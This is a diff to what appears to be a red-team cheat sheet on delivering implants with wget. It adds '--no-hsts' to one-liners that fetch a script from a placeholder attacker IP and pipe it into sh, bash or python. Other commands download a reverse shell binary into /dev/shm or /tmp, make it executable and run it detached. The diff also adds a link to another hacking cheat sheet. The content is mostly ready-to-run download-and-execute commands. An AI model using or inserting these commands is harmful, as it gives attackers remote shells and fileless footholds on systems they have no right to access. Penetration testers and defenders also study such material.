@@ -5,11 +5,11 @@
 This is useful if the machine doesn't have `curl` pre-installed so you can use `wget` to execute it in memory.
 
 ```
-$ wget -qO- http[s]://<IP>/implant.sh | sh
+$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | sh
 
-$ wget -qO- http[s]://<IP>/implant.sh | bash
+$ wget --no-hsts -qO- http[s]://<IP>/implant.sh | bash
 
-$ wget -qO- http[s]://<IP>/implant.py | python
+$ wget --no-hsts -qO- http[s]://<IP>/implant.py | python
 ```
 
 ## 02 - Dropping on memory
@@ -17,9 +17,9 @@ $ wget -qO- http[s]://<IP>/implant.py | python
 Download reverse shell binary and execute it.
 
 ```
-$ wget -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
+$ wget --no-hsts -P /dev/shm http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
 
-$ wget -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
+$ wget --no-hsts -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /dev/shm/implant & disown
 ```
 
 ## 03 - Dropping on disk
@@ -27,7 +27,7 @@ $ wget -O /dev/shm/implant http[s]://<IP>/implant; chmod +x /dev/shm/implant; /d
 Download reverse shell binary and execute it.
 
 ```
-$ wget -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
+$ wget --no-hsts -O /tmp/implant http[s]://<IP>/implant; chmod +x /tmp/implant; /tmp/implant & disown
 ```
 
 ## 03 - Compiled After Delivery
@@ -40,6 +40,10 @@ $ gcc
 
 ---
 ## References
+
+### Github
+
+- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)
 
 ### GTFOArgs
 
